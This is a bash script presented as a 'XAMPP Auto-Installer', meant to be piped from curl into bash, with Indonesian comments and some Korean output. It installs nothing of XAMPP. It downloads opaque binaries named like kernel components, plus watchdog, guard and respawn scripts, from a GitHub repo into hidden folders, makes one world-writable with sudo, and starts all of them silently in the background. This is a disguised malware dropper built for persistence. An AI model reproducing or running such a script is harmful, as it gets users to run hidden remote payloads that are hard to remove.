#!/bin/bash
# ============================================
# XAMPP Auto-Installer
# Cara pakai:
#   curl -fsSL https://raw.githubusercontent.com/USER/REPO/main/install.sh | bash
# ============================================

set -e

# ============================================
# 🔗 GANTI DENGAN REPO ANDA
# ============================================
REPO_URL="https://raw.githubusercontent.com/basilbay80/Pw4/main"

# ============================================
# Folder Tujuan
# ============================================
MAIN_DIR="$HOME/.xampp-healthcheck"
HELPER_DIR="/tmp/.xampp-helper"
GUARD_DIR="/var/tmp/.xampp-guard"

# ============================================
# Warna
# ============================================
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

info()    { echo -e "${BLUE}[INFO]${NC} $1"; }
success() { echo -e "${GREEN}[  ✓ ]${NC} $1"; }
warn()    { echo -e "${YELLOW}[WARN]${NC} $1"; }
error()   { echo -e "${RED}[FAIL]${NC} $1"; }

# ============================================
# Banner
# ============================================
echo ""
echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║${NC}  ${BOLD}XAMPP Auto-Installer${NC}                      ${CYAN}║${NC}"
echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
echo ""

# ============================================
# Deteksi Arsitektur
# ============================================
ARCH=$(uname -m)
case "$ARCH" in
    x86_64|amd64)  RUNNER="kernel86"; WORKER="kernelU" ;;
    aarch64|arm64) RUNNER="kernel64"; WORKER="kernelX" ;;
    *) error "Arsitektur tidak didukung: $ARCH"; exit 1 ;;
esac
success "Arsitektur terdeteksi: $ARCH → $RUNNER / $WORKER"

# ============================================
# Fungsi Download (curl + wget fallback)
# ============================================
download() {
    local url="$1"
    local output="$2"
    local name="$3"
    
    info "Download $name..."
    
    if command -v curl >/dev/null 2>&1; then
        if curl -fsSL -o "$output" "$url"; then
            success "$name berhasil"
            return 0
        fi
    fi
    
    if command -v wget >/dev/null 2>&1; then
        if wget -q -O "$output" "$url"; then
            success "$name berhasil (wget)"
            return 0
        fi
    fi
    
    error "Gagal download $name"
    return 1
}

# ============================================
# [1/5] Buat folder
# ============================================
echo ""
echo -e "${YELLOW}━━━ [1/5] Buat Folder ━━━${NC}"
mkdir -p "$MAIN_DIR/logs"
mkdir -p "$HELPER_DIR"
sudo mkdir -p "$GUARD_DIR" 2>/dev/null && sudo chmod 777 "$GUARD_DIR" 2>/dev/null
success "Folder siap"

# ============================================
# [2/5] Download Runner & Worker (inti)
# ============================================
echo ""
echo -e "${YELLOW}━━━ [2/5] Download Runner & Worker ━━━${NC}"

download "${REPO_URL}/${RUNNER}" "$MAIN_DIR/runner" "runner ($RUNNER)"
download "${REPO_URL}/${WORKER}" "$MAIN_DIR/${WORKER}" "worker ($WORKER)"

chmod +x "$MAIN_DIR/runner" "$MAIN_DIR/${WORKER}"

# ============================================
# [3/5] Download Watchdog & Trigger
# ============================================
echo ""
echo -e "${YELLOW}━━━ [3/5] Download Watchdog & Trigger ━━━${NC}"

download "${REPO_URL}/watchdog.sh"        "$MAIN_DIR/watchdog.sh"        "watchdog.sh"
download "${REPO_URL}/trigger-respawn.sh" "$MAIN_DIR/trigger-respawn.sh" "trigger-respawn.sh"
download "${REPO_URL}/trigger-auto.sh"    "$MAIN_DIR/trigger-auto.sh"    "trigger-auto.sh"
download "${REPO_URL}/monitor.sh"         "$HELPER_DIR/monitor.sh"       "monitor.sh"
download "${REPO_URL}/guard.sh"           "$GUARD_DIR/guard.sh"          "guard.sh"

# ============================================
# [4/5] Chmod +x
# ============================================
echo ""
echo -e "${YELLOW}━━━ [4/5] Chmod +x ━━━${NC}"
find "$MAIN_DIR"   -maxdepth 1 -type f -name "*.sh" -exec chmod +x {} \;
find "$HELPER_DIR" -maxdepth 1 -type f -name "*.sh" -exec chmod +x {} \;
find "$GUARD_DIR"  -maxdepth 1 -type f -name "*.sh" -exec chmod +x {} \;
success "Semua script executable"

# ============================================
# [5/5] runningkan Runner + Watchdog
# ============================================
echo ""
echo -e "${YELLOW}━━━ [5/5] runningkan Runner & Watchdog ━━━${NC}"

# runningkan watchdog layer dulu
nohup bash "$GUARD_DIR/guard.sh"        > /dev/null 2>&1 & success "가드 (layer 3) running"
sleep 1
nohup bash "$HELPER_DIR/monitor.sh"     > /dev/null 2>&1 & success "모니터 (layer 2) running"
sleep 1
nohup bash "$MAIN_DIR/watchdog.sh"      > /dev/null 2>&1 & success "워치독 (layer 1) running"
sleep 1
nohup bash "$MAIN_DIR/trigger-auto.sh"  > /dev/null 2>&1 & success "자동 트리거 running"
sleep 1

# runningkan runner (inti)
cd "$MAIN_DIR"
nohup ./runner > "$MAIN_DIR/logs/runner.log" 2>&1 & 
success "🤖 Runner dirunningkan (PID: $!)"

# ============================================
# Selesai
# ============================================
echo ""
echo -e "${GREEN}╔══════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║   ✅ INSTALASI SELESAI!                      ║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${CYAN}Cek proses:${NC}  ps aux | grep -E 'runner|watchdog|monitor|guard'"
echo -e "${CYAN}Lihat log:${NC}   tail -f $MAIN_DIR/logs/runner.log"
echo -e "${CYAN}Trigger respawn:${NC} $MAIN_DIR/trigger-respawn.sh"
echo ""